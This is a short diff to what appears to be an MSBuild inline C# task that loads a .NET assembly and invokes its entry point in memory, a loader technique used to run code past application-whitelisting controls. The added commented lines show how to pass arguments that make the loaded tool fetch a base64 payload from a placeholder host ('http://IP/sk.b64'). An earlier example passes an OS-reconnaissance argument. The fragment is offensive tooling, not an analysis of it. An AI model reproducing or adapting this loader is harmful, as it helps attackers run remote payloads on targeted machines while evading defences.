@@ -41,9 +41,15 @@
 			 
 			 //If Args are required uncomment below two lines and comment above line
 			 //string[] args1 = new string[] { "BasicOSInfo" };
-             //a.EntryPoint.Invoke(null, new object[] { args1 });
+                         //a.EntryPoint.Invoke(null, new object[] { args1 });
+
+                         //If multiple Args are needed
+			 //string args1 = "-net";
+			 //string args2 = "http://IP/sk.b64";
+			 //string args3 = "\"test\"";
+			 //a.EntryPoint.Invoke(null, new object[] { new string[] { args1, args2, args3 } });			 
 			 
-			 return true;
+                         return true;
 		   }
 		}     
 	      ]]>
